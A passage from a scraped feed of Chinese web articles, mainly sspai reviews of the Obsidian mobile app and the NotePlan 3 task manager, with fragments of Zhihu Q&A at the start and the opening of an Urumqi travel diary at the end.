href=\"https://www.zhihu.com/question/24921291\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>爸爸对我的网名头像发起了进攻，家长中意的到底是什么样的？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>陶天相</span>\n<a href=\"https://www.zhihu.com/question/334200118/answer/794404125\" hidden>阅读原文</a>\n</div>\n<div>\n<p>你们的爸爸只是对你们的头像有意见，而我的爸爸是对我的头有意见啊</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/334200118\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>一个美术生，如何靠板绘赚钱？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户，</span><span>有事私信问 不看付费咨询。</span>\n<a href=\"https://www.zhihu.com/question/337840459/answer/918427948\" hidden>阅读原文</a>\n</div>\n<div>\n<p>很简单啊，</p>\n<p>找朋友便宜点进手绘板</p>\n<p>再原价卖出去</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/337840459\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9738098"},{"title":"或许也是你「入坑」的好机会：Obsidian 移动端上手体验","date":"2021-07-14 08:00:00","description":"\n<p>作为个人知识管理界的头部软件，Obsidian 的桌面端程序已经收获了大批用户，在少数派网站上也引发了不少讨论。</p>\n<p>然而，天下苦移动端缺席久矣。在没有移动端的情况下，Obsidian 只能在桌面端进行访问。如果离开了电脑，只能随手记在其他程序中，等有条件的时候再进行归集；之前也试过使用同步软件「曲线救国」，但由于时常产生版本冲突，加之手机端缺少趁手的 Markdown 编辑软件，最终只好作罢。</p>\n<p>千呼万唤，Obsidian 的移动端 app 在几个月的封闭内测之后终于在本周向所有用户开放下载。几天使用下来，移动端的使用体验超出了我的预期，为 Obsidian提供了更多的使用场景。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/13/eb346fe2a0fddae29f9a523aaa0c520a.png\"><figcaption>图片来自官方网站</figcaption></figure><h2>多渠道数据同步</h2>\n<p>谈到移动端，就不得不先谈一谈同步这个话题。打开程序后的第一个界面需要选择库建立的方式：本地或云端同步。这一选择在之后无法修改。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/13/5ff0e4b3d7532d3a93670efa75cf2220.jpeg\"></figure><p>本次的 Obsidian 移动端支持多种同步方式，而且 Apple 设备与 Android 设备之间有所不同。</p>\n<p>两个系统均支持 Obsidian 自有的 Obsidian Sync （每月4美元订阅），并可以跨平台进行同步。此外，Android 系统支持第三方软件，如 Dropsync 和 Foldersync。</p>\n<p>由于系统限制，苹果设备目前仅支持 Obsidian Sync 和 iCloud 的同步，选择相对较少，但从实际体验来看，基于 iCloud 的同步在中国大陆较为顺畅，使用体验大幅优于基于境外服务器的 Roam Research 等服务，这几天暂未出现内容丢失或冲突的情况。</p>\n<h2>桌面端插件体验也能迁移</h2>\n<p>对于熟悉桌面版 Obsidian 的用户而言，移动端的功能和使用体验可谓「无缝对接」。不仅编辑窗格和使用语法一模一样，大多数插件也可以直接运用于移动端上。</p>\n<p>如果我在手机端上安装了某个插件或更改了一个设置，那当我回到家打开桌面端时，相关的插件和设置会被自动同步。我自己在用的两个社区插件 Calendar 和 Todo，在手机上的显示效果与电脑上就并无二异。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/13/d21490ea96e8df97c693b1de2997dc74.jpg\"></figure><h2>面向移动端的改进</h2>\n<p>虽然说功能和界面做到了「像素级复刻」，最让我心动的还是这款 App 基于移动端的特点做出了不少用心的改进。这一点从设置菜单中增设的 Mobile 子菜单就可见一斑。</p>\n<p>首先，由于手机屏幕的空间有限，软件的默认界面是全屏幕的编辑器，而非桌面端三栏式编辑器。如果需要访问侧边栏，只需在编辑界面点击左上角和右上角的图标，抑或是在主界面任意位置左右滑动即可。</p>\n<p>在使用移动端之前我对于输入体验有着不少担忧。Obsidian 在桌面端的输入颇为硬核，基本都是手动输入 Markdown 语法。在手机上输入这么多符号可不是件那么「优雅」的事。好在 Obsidian 在编辑器界面，和 Noteplan 与 Roam Research 的移动端一样，提供了一条便于操作的工具栏。更重要的是，在 Mobile 菜单中可以进行功能与排序的自定义。</p>\n<p>例如，我根据我自己的使用场景和需求，把我默认的工具栏排序改成了下图设置：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/13/696932117c92056207a7458eab9c1afb.jpeg\"></figure><ul>\n<li>第一个按钮可以自动输入一对双括号 <code>[[ ]]</code>，用来建立双向链接。第二个按钮则用来输入 <code>#</code> 的标签。这比起将输入法（尤其是中文输入法）切换到符号页面再进行键入方便了不少。</li>\n<li>第三个按钮可以自动插入当前时间戳，对于我记录每天的工作流程非常实用。在 Roam Research 当中可以用 <code>/now</code> 进行快速输入，这曾经让迁移到 Noteplan 的我颇为想念。如今的按钮更是免去了手动输入的繁琐。</li>\n<li>随后三个按钮便于我采用类似于大纲模式的列表进行笔记。而最后一个按钮可以一键将内容转化为待办事项，并在 <code>[ ]</code> 和 <code>[x]</code> 之间进行快速切换。</li>\n</ul>\n<p>此外，引用、代码块、超链接等 Markdown 语法均在工具栏有对应的快捷按钮。在根据个人使用习惯进行了设置后，我的日常记录效率得到了进一步提升，这也是我放弃 Noteplan 转投 Obsidian 的原因之一。</p>\n<p>由于手机是触摸屏，Obsidian 还新增了一个在编辑界面下拉的快捷操作。比如我就将其设置为了创建新的笔记，免去了我打开侧边栏进行点击的操作。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/13/ba0c9127b5dff290d67f702738e071ec.jpeg\"></figure><h2>不足之处</h2>\n<p>尽管作为第一版移动端程序 Obsidian 已经超出了我的预期，但仍有一些功能在我的愿望清单上。</p>\n<p>首先是块引用。虽然块引用已经可以在电脑端上实现，但是在移动端似乎尚不能通过 <code>^</code> 完成内容的链接。尽管块引用的缺席不影响日常使用，但是希望能够早日补上这一功能，为移动端的使用提供更大的想象空间。</p>\n<p>另一个则是社区呼吁已久的「所见即所得」功能。虽然自软件诞生伊始起，Obsidian 的这一硬核显示风格就没有发生更改，但它引发的问题在有限的手机屏幕上或许更为突出。小小的空间内显示诸多的 <code>#</code> 和 <code>*</code> 等 Markdown 语法颇有些拥挤，影响了视线内的有效信息含量；而预览模式又无法实现编辑。或许移动端的推出可以加速这一功能在全平台的实现吧。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/13/2f09642da6de62f056e89ddb2e2f30e9.png\"><figcaption>图片来自官方网站</figcaption></figure><h2>结语</h2>\n<p>接触到 Daily note 和双链结构后，我和许多少数派的朋友们一样，尝试过了多款类似的软件。由于我希望把我的每日日程和随手记的功能加入到 Daily note 中，奈何公司无法自由访问外网，移动端的使用体验就成了我的一个刚性需求。</p>\n<p>而我最开始使用的 Roam Research 尽管功能强大，但在手机仅提供网页端，并且由于网络原因每次打开都需要等待十几秒钟甚至无法打开，使用体验一般，转向 Noteplan 3 之后移动端使用体验才有显著提升，直到 Obsidian 的移动端出现——丰富的插件生态和更好的移动端体验让我就毅然决定把 Noteplan 文件夹下的所有 Markdown 文件移动到了 Obsidian 的库中。</p>\n<p>Obsidian 移动端没有辜负我的等待。它延续了桌面版流畅的手感和丰富的功能，并且对移动使用场景做了有针对性的优化。我个人基于 Markdown 的工作流以及日程管理也随之打通。</p>\n<p>随着软件的更新，相信它可以在不同的领域给我们带来更多的便利，也期待在这里看到大家分享的经验与用法。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/us/app/obsidian-connected-notes/id1557175442\" target=\"_blank\">App Store</a> 和 Google <a href=\"https://play.google.com/store/apps/details?id=md.obsidian\" target=\"_blank\">Play 商店</a> 免费下载 Obsidian。</p>\n<span class=\"ss-application\" app-id=\"16115\"> </span><p><strong>关联阅读：</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/63481\" target=\"_blank\">玩转 Obsidian | 基础设置篇</a></li>\n<li><a href=\"https://sspai.com/post/62414\" target=\"_blank\">玩转 Obsidian | 打造知识循环利器</a></li>\n<li><a href=\"https://sspai.com/post/66094\" target=\"_blank\">让 Obsidian 更好用，这些社区插件值得试试</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67698"},{"title":"任务、笔记、日历三合一，你的全能时间管理工具：NotePlan 3","date":"2021-07-14 06:31:39","description":"\n<p>在工作事物与生活琐事交错纠缠时，我们总会想着，要是有一个秘书能够独立于我们而分类处理好杂事，并最后把真正需要我们操作的部分呈递上来，那么一切都会变得简单很多。既然借助人事会面临诸多沟通问题，一些具备个人管理能力的用户就将将注意力转移至任务管理应用，结合自身实际要求与应用特性，来打造稳定的个人体系。</p>\n<p>不得不说，正是由于每个人都会面临这些困境，应用市场的任务管理 app 近几年间数量激增。OmniFocus、Things 或滴答清单等热门应用都以其完整功能成为不少效率玩家的心头之好，但一个从未接触过 GTD 概念的人可能在囫囵之间就盲目使用了这些功能复杂的高门槛工具，从而导致建立个人体系的尝试一度因为耗费精力过多而作罢。</p>\n<p>借助应用，我们可以从头建立一套完整的个人体系，也可以将其嵌入至其中一环成为光滑的工作流；而个人体系，反过来说，也不得不根据它们的逻辑结构进行调整和适配。所以，在挑选（尤其是）任务管理应用时，最重要的参考因素并非应用的功能涵盖面、复杂程度或用户群体数量，而应该是其逻辑是否能够为我所用，从而成为我效率体系的骨架。</p>\n<p>做任务管理，不可或缺的其一元素恰是时间。NotePlan 3 利用时间为线索，并使用纯文本为血肉，打造出了一位功能健全的机器人秘书。与常见的任务管理应用不同，NotePlan 3 并非以项目或动作为核心，再将时间作为其一属性。它首先是日历，在每一甚至没有任务内容的日期上都会建立空白单位，然后才将任务作为日期的附属品添加其上。这一核心的转移使因外力遭遇的任务时期变动较前者更为简单。</p>\n<h2>NotePlan 的每日记录</h2>\n<p>想象一幅巨大的日历，打开之后其中的每一日期单位是日历格子上粘着的一张便条，这张便条将会承载与今日有关的所有内容，包括：</p>\n<ul>\n<li>晚餐需要采购的食材</li>\n<li>晚上八点打电话给潘主任</li>\n<li>四点半银行下班前取钱</li>\n<li>……</li>\n</ul>\n<p>等等琐事。它们可以看起来毫无章法，随心所欲，而不根据时序或特定规则来排列。</p>\n<p>NotePlan 3 的内容输入采用的恰是这样的方式。类似于一级收件箱，用户产生的待办或提醒可以被第一时间记录下来，交由机器秘书进行排序，而无需主观进行分类。NotePlan 3 与常用任务管理应用不同，实际上，它并没有收件箱这一缺省文件夹（尽管收件箱逻辑仍旧兼容于这一体系）。</p>\n<p>任意与当日有关的内容都可以以任何叙述形式记录于 Daily Notes 中，诸如琐事、待办或是灵感。NotePlan 3 的目的，就是让用户耗费最少的无效精力，而整合出最有效的任务笔记。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/20147a0dbda325bd3c550646dc28d4d7.png\"></figure><p>在 NotePlan 3 的主界面右侧，我们可以看到展开的月历和其下的当日时刻表。任何添加到系统账户中的日历事件以及提醒事项都会同步到此处，仅作检视使用，NotePlan 3 不会对系统内容作任何修改；而在 NotePlan 3 中添加的事件或提醒，也不会被同步至日历。这一设置，是为了将任务管理系统与固有的活动事件作明显区分，利用确定的时刻表来自由安排余下的个人行动才是使用 NotePlan 3 的目的所在。</p>\n<p>在月历中，我们可以看到每个日期内具有三种标记：</p>\n<ul>\n<li>对勾，表示已完成的待办事项；</li>\n<li>圆圈，表示未完成的待办事项；</li>\n<li>圆点，表示系统日历在当日有活动。</li>\n</ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/12/0cc76a445027337a62f0ab6a83d710d0.png\"></figure><p>观察月历格子，我们还可以发现有的格子为橙色，这说明这些日期中存在逾期任务。我们可以在月历视图中看到笔记分布的密度，以跟踪每日记录习惯的养成情况，或是根据待办事项了解工作周期，又或者检查任务完成的拖延程度。</p>\n<p>利用 Markdown 语法，我们还可以使输入内容更条分缕析。目前 NotePlan 3 支持的 Markdown 语法包括以下内容。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/12/c403bc4bdb45e5a507924fa0ab26f026.png\"></figure><p>缺省设置中，「*」用以标记待办事项，而「-」用以标记子弹笔记。这一标记可以在应用的偏好设置中进行更换。但是要注意的是，由于应用界面会将纯文本编译，而不同设备间文件的同步形式为纯文本，在不同设备间如果标记设置不同，编译呈现的结果也会不同。</p>\n<p>最新版本的标题支持至四级，还增添了对代码块的支持，使用：</p>\n<pre class=\"language-javascript\"><code>```javascript\nYour code goes here\n```</code></pre>\n<p>输入，能自动识别 185 种代码语言，也支持手动定义。识别后的代码形式具有 90 种主题，当然也可以自定义主题。支持的主题列表如 <a href=\"https://help.noteplan.co/article/85-code-fencing-themes\" target=\"_blank\">链接</a> 所示，除了上图所示的基础 Markdown 语法内容，用户还可以在应用的 JSON 文件中添加一些可用的 Markdown 表达，比如高亮、优先级、删除线或下划线等。你可以在这一 <a href=\"https://help.noteplan.co/article/45-extend-noteplans-markdown\" target=\"_blank\">链接</a> 中找到编辑示例。</p>\n<p>根据 NotePlan 3 的纯文本特性，我们可以预设相应的每日模版，使用剪贴板将框架布置完全，再将每天面对的琐琐屑屑补充其上。当然，我们也可以调出 Mac 系统中的「设置」&gt;「键盘」&gt;「文本」，直接把模版设置为常用短语，使用文本替换粘贴至每日记录中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/b6faeeeccdea56db2c652db956980752.png\"></figure><p>在每日记录中添加有关时刻的任务、事件或提醒有三种方法：</p>\n<ol>\n<li>使用「at」表达，其后跟随确定的时刻，如 <code>Reply to emails at 3pm - 4pm</code> ；</li>\n<li>使用「冒号」表达，表明具体的时分 HH:mm ，如 <code>3:00pm - 4:00pm Reply to emails </code>；在这种表达中，也可以使用 24 小时制；</li>\n<li>在右侧的时间线中点击对应的时刻添加。</li>\n</ol>\n<p>使用自然语言识别时间来添加事件，恰好符合纯文本骨架的设置目的。任何涉及相关事件的备忘只需要与时刻点纪录在同一自然段，就能将待办任务嵌入于相应语境中，为查阅和完成任务提供了必要的补充信息。</p>\n<p>关于任务的状态更改，除了鼠标单击外，也能使用键盘快捷键来完成，符合纯文本应用手不离键的诉求。任意项目都可以在段落左侧箭头处唤出时间菜单，从而进行相应的修改。</p>\n<ul>\n<li>待办事项的完成可以直接勾选，也可以使用快捷键「CMD+D」标记。</li>\n<li>提醒事件的删除可以选择「Cancel」，也可以使用快捷键「CMD + R」标记。与直接删除文本不同，事件的删除状态可以表示它的停止运行，但它的存在可能以其他形式影响总项目的进度。直接删除文本则会抹掉它在其他任务中的相关背景。</li>\n<li>任务的时间重排可以直接在菜单中选定，或是快捷键「CMD + Shift + D」，也可以利用纯文本特性将其剪切粘贴。</li>\n<li>任务的重复可以选定频率为「日」「周」「月」「季」或「年」，并添加相应的重复次数。应用并未设置自定义重复项。据开发者所述，这一设置是为了使用户明确思考某些任务的重复必要性，而每一次复制粘贴的动作恰是再思考的强化仪式。<br>除此之外，应用还设置了一系列其他快捷键来化简时间调整或新建任务的手续。</li>\n</ul>\n<h2>NotePlan 的项目纪录</h2>\n<p>当然，尽管以时间作血脉，NotePlan 3 中同样存在与时间无关的文件单位，它们可以被存放于文件夹内，保存形式与通常 .md 文件无异。而项目纪录的出现，恰是考虑到了使用 NotePlan 3 最有效的一种应用场景——会议记录。当我们需要周期性地开会，并在每次会议中面对不同的任务，涉及到不同的人员及完成时间时，使用 NotePlan 3 的 Notes 来统筹是一种非常适合置入工作流的选择。</p>\n<p>NotePlan 3 的 Notes 即普通的文本文件，能够使用应用特制的时间识别，而将任务统筹至相应的每日记录中。也就是说，这一机器秘书能够自主将用户针对同一项目不同截止时间的任务分发下去，从而节省其中分辨和分配的无效精力。而所谓与时间无关的文件单位，指的是每日记录中使用的时间段识别在这类文件中无效。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/f3a8be3ceb477ef8b86a52388cc3ab37.png\"></figure><p>同样，我们可以使用通常的记录方式，然后再根据应用特性将日期标记其上，而不会降低记录文件的可读性。我们可以在自然段的任意位置以 <code>&gt;YYYY-MM-DD</code> 或 <code>[[YYYY-MM-DD]]</code> 的形式将该记录关联至相应的每日记录中。敏锐的读者不难发现，后者恰是从去年就开始兴起的双向链接形式，这说明项目纪录与每日记录是可以双向编辑同步的。</p>\n<p>在项目纪录中标记的内容，会置于相应的每日记录页面最上方，标记为「Reference」，并显示相关自然段，以便于用户在打开每日记录处理当日事项强化了任务所在的语境。两个关联文件之间可以相互跳转。两种标记方式在项目纪录中并无区分，只是在每日记录中，当采用「&gt;」标记时，应用就不会在相应日期文件中显示「Reference」。</p>\n<p>这一设置通过标记语义很好理解，「&gt;」可理解为安排时间，因此更适合用作任务截止日期的指派和重排，并且可以使用自然语言「today」或者「nextweek」来设置；而 <code>[[]]</code> 则是大家熟悉的新建文件并与本文件建立双向关联的标记形式，故能够通过「Reference」溯洄至原文件中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/4b6588fd7e26d2655263cc77be7bd4a1.png\"></figure><p>这样一来，显而易见地，我们同样可以使用 <code>[[笔记名称]]</code> 的标记来创建新文件，只需要在相应文本中输入，并点击该笔记名称即可创建并跳转到新文件中。双向链接总是出现在记录页面的最上方，提醒用户这一事件不止局限于当前文件中，或许与其他文件内容或历史时间有关。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/12/2bad31de90c9221742c4e7236e36e706.png\"><figcaption>iOS 系统中的每日记录界面</figcaption></figure><p>之前我们提到，使用项目文件来做会议记录非常方便，这是因为除了时间分配外，NotePlan 3 还设置了相关人员标记「@」以及标签「#」。前者便于肃清会议相关任务的人员指派，而后者则将与文件夹一起，共同成为整理文件最重要的分类准则。实际上，这也是一个标记语义的使用习惯，这两个标记的使用方法在操作中是一致的。文件夹与标签最大的区别恰在于，一个文件只能被归纳于一个文件夹中，而可以同时具有多个标签。</p>\n<p>在 NotePlan 3 中，这个同时具有多个标签的实义可以解释为，对于文本文件中的每一任务单元都可以分配不同标签，甚至一个任务可以分配多个标签。所以，我们通常可以将不可合并同类的最小项作为文件夹名称，而将可以共存的特征作为标签条目。</p>\n<p>举个例子来说，我们可以使用任务的完成状态来设置文件夹名称，并在前面标上数字以便于理解状态顺序，然后在菜单栏的「View」中启用「Sort Notes By 」→「Title」，如：</p>\n<ul>\n<li>00 - Planned</li>\n<li>01 - In Progress</li>\n<li>02 - In Review</li>\n<li>03 - Done</li>\n<li>04 - Archive</li>\n</ul>\n<p>也可以设置文件夹为：</p>\n<ul>\n<li>00 - Inbox</li>\n<li>01 - Next Projects</li>\n<li>02 - Waiting for</li>\n<li>03 - Anytime</li>\n<li>04 - Someday</li>\n<li>05 - Reference</li>\n<li>06 - Archive</li>\n</ul>\n<p>来划分一个完整的 GTD 任务系统。</p>\n<p>或者，也可以使用分级标签法，将标签记为「status-appended」「status-waiting」和「status-YetToStart」来标记不同任务的状态，或是「Workspace-Office」「Workspace-home」，而将此时的文件夹按照项目名称归类。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/959b229805c4e9e562659a9e855efad1.png\"></figure><p>我们还可以利用双向链接来设置一个「目录页」汇总不同的笔记或是项目。只不过，这种目录页需要我们主动完成，而非机器秘书能够代劳的。开发者表示，这是为了避免用户因过度依赖自动化而失去对手头项目的线索，导致不必要文件的堆积。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/12/article/5b4fdf7db29bc9027effc5b54e6c8db5\"></figure><p>除此之外，我们还可以利用双向链接的跳转能力建立相关的翻页动作，我们可以将下一步将要执行的内容链接至当前页面。显然，与一般书籍翻页不同的是，当前笔记的下一页并不唯一，我们可以根据项目走向给它安排多条不同的文件链接。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/12/article/7cc4132e8fcd1ad197a6e58aeda4e948\"></figure><h2>NotePlan 的笔记检视</h2>\n<p>如果任务和笔记只有记录动作而不存在进一步的查阅或审核，那么自动化的存在就失去了它的必要性。但当我们长期将个人体系维系在一款应用中时，相关的记录信息难免出现冗杂混乱的局面，寻找关键词在此处就显得尤为重要。</p>\n<p>NotePlan 3 最值得称道的功能之一，在于它的命令栏。使用快捷键「CMD + J」唤起，它可以全局搜索 NotePlan 3 中所有文件的任意一处。这恰是因为我们将任务内容都嵌入了相关语境中，搜索精细程度自然与常见标题搜索不同。</p>\n<p>不仅如此，命令栏的搜索可以匹配到字符，而非以词为单位，故而查询的关键词可以不必完全还原。这种模糊搜索大大提高了我们寻找至目标文段的成功率。同时，它还为我们设置文件名称提供了一种可能性，除了常见易于排序的时序命名法，我们还可以直接使用极具描述性的文件名称（或小标题）来增强搜索成功率。</p>\n<p>如果命令栏不键入任何信息，则自动呈现最近编辑过的笔记，方便在同时修改多个文件时相互跳转。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/12/article/a54817d0a89a3fca083383615bda4b45\"></figure><p>进一步地，我们知道 NotePlan 3 会为每一日期建立新的文本文件，因此我们也可以通过直接输入某个特定日期来跳转到该「每日文件」中，即使我们之前从未在该日记录任何信息。这一点暗示了我们可以使用命令栏来创建新文件或添加新任务，所以我们当然也可以直接输入任务内容并使用熟悉的时刻标记。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/12/d93697df57794ab331adec8bf20ab3db.png\"></figure><p>命令栏同样可以在 NotePlan 3 后台运行时使用，此时的快捷键为「CMD + CTRL + J」。我们可以利用这一全局快捷键，在遇到需要记录的内容时直接复制到命令栏中并标记日期或时刻（如果是分配至今日文件中），从而将内容记录下来，而毋需额外打开文件或跳转至应用。用这一方式记录稍后读或填表网址令人出乎意料地好用。</p>\n<p>在应用内使用搜索栏，我们则可以看到与之有关的一系列文件。预设的标签和人员可以直接使用，所有内容将联合相关文段列表显示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/7d76e9f74681c995a2b8dccf3436e8d2.png\"></figure><p>在一套流畅的 GTD 系统中，日检视和周检视总是非常必要的。日检视可以安排在每日工作开始前，便于了解当日工作量，以及掌握具体的工作内容。通常，可以在此时将原本未做处理的初级任务做粗处理，安排相关的项目、人员、进行时段和完成时间。或者，日检视也可以安排在每日工作结束后，便于评估今日个人能力与任务安排的匹配程度，分辨个人体系的负荷，并对次日内容进行相应的调整。而周检视，则将评估范围扩大，更能有效排除因特殊原因导致系统不稳定的情况，从而做出更适合的调整。</p>\n<p>在观察时，我们可以使用左栏的「Week」，并着眼于本周的任务数目以及完成百分比，同时不要忽略的 NotePlan 3 的笔记特性，而将本周涉及的笔记大致浏览一番，确保能对相关事项都产生印象。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/cb14e0e98bbe45256c267b7e28cef2c5.png\"></figure><p>另外，我们还可以自定义检视条件，筛选出某些特定内容。「Review」中提供了一些预设过滤器：</p>\n<ul>\n<li>All Tasks，筛选出每日记录和项目纪录中的开放任务，完成和删除任务不显示在此处。</li>\n<li>Notes Tasks，筛选出项目纪录中的任务，每日记录中的任务不显示在此处。</li>\n<li>Overdue，筛选出所有逾期任务。</li>\n<li>Upcoming，筛选出所有今日及以后的待完成任务。</li>\n</ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/12/article/fa3f9e832c93306a69ab857eb5a19316\"></figure><p>当然我们也可以利用诸多条件来建立自己常用的任务过滤器，此处「Regular Notes」为项目笔记，而「Calendar Notes」为每日笔记，「Open」指的是未完成的待办事项，「Scheduled」指的是具有时间标记的笔记文段，「No Status」指的是内容不限于待办事项，也可以是子弹笔记或自然文段。我们可以尝试以下情况的筛选：</p>\n<ul>\n<li>当某一项目需要跟踪近况时，我们可以选择「Search In → Regular Notes」，「Status → Open; Done; Scheduled; Canceled」「Timeframe → This Month」「Keywords → 项目名称」；</li>\n<li>当我们做周检视时，可以在周五下班前查看本周剩余未完成任务是否需要移至周末完成，或是否顺延至下一工作日，此时可以选择「Search In → Regular Notes; Calendar Notes」「Status → Open」「Timeframe → This Week」「Keywords → Work space-Office」。</li>\n</ul>\n<h2>总结</h2>\n<p>总而言之，NotePlan 3 是一款将任务嵌至记录语境中，以时间线为血脉串联统筹所有任务的应用。它能够精确地满足我们对于时间管理的需求，整理个人体系中的繁杂事务并以整齐的方式呈现报告。它具有三大特性：纯文本、时间核心以及双向链接，以这三者为结构能够建立起一套完整的个人系统。当然，我们也可以将 NotePlan 3 作为系统的其中一环，将其作为任务的中转方，所有待输入的内容在其他应用中进行粗处理后再流入 NotePlan 3 中，当任务进行状态流动时，把相关更具体的笔记置入更具有专业性的应用中，从而实现多应用的联合结构。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/noteplan-3/id1505432629\" target=\"_blank\">App Store</a> 下载 NotePlan，应用支持 iOS、iPadOS、macOS 平台，年订阅价格 338 元；<a href=\"https://sspai.com/item/235\" target=\"_blank\">Setapp</a> 用户可以免费获取 NotePlan。</p>\n<span class=\"ss-application\" app-id=\"16111\"> </span><p>你对依赖任务管理应用构建的 GTD 系统有什么心得？欢迎在评论区和我们分享。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67660"},{"title":"快乐飞旅行报告 10：我在乌鲁木齐吃了三顿烤包子","date":"2021-07-14 03:19:04","description":"\n<p>在 2020 年底，南航推出了快乐飞 2.0，我终于下定决心开启周末全国飞的计划。上半年假期多，南航快乐飞不局限在周末，买它准没错。万万没想到的是疫情再次来袭，一直拖到了今年 3 月底，我才正式出行，好歹也算抓住了快乐飞的下半程。</p>\n<p>本篇是我的快乐飞旅行游记的第十篇，我会以一个系列的形式向大家分享我这三个月的快乐飞旅行见闻，希望大家喜欢。（到最后，如果南航继续推出快乐飞 3.0，我再来做个快乐飞购买总结。）</p>\n<hr>\n<p>到了快乐飞的尾声，说实话已经身心俱疲。刚开始的那种新鲜感，想要游遍所有航线的冲动已经消磨大半，加上华东进入梅雨季节之后，雷雨频繁、延误常见，消磨了另一半的斗志。我正打算提前终止飞行之际，却因刚好读完班宇的《逍遥游》而受到了启发：这很可能是我第一次也是最后一次来这儿。这么一想，又萌发了再去看看世界的念头。</p>\n<p>天意是，连续几天都听到航班大面积延误，但出发去乌鲁木齐的当天，准时登机。这次选择的目的地是来回飞一次就能回本的乌鲁木齐，选择这里的原因是另一本书——刘子超的中亚游记《失落的卫星》。这次出行的时间是 6 月 19 日 - 6 月 21 日，一人行。</p>\n<h2>五小时飞行：错过博格达峰</h2>\n<p>从杭州飞往乌鲁木齐耗时 5 小时，这是我飞行最久的一次，原先想象会是一路睡眠之旅，结果在起飞前意外刷到了博格达峰的照片，于是种草。博格达峰，是乌鲁木齐的境内、天山山脉的著名高峰，山势连绵、常年被积雪覆盖，海拔五千多米。因此飞行在 8000 米左右的飞机上，可以俯视博格达峰。</p>\n<p>从上海、杭州等东部城市飞往乌鲁木齐，在落地前约一小时经过博格达峰，提前选好左侧后排座位（返程时选右排），即可在飞行醒来之后一睹博格达峰美景。可惜，这次来回乌鲁木齐，皆是厚厚的云朵累积在天山上方，丝毫不见博格达峰的身影。只有返程的飞机上，在起飞不久后，突然云朵像开了一扇窗一样，露出来点点的绵延雪山。后来看飞行轨迹应该是在甘肃和青海交界的山脉，在祁连山脉前、阿尔金山脉后。此两番皆与天山山脉无缘，深感遗憾。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img 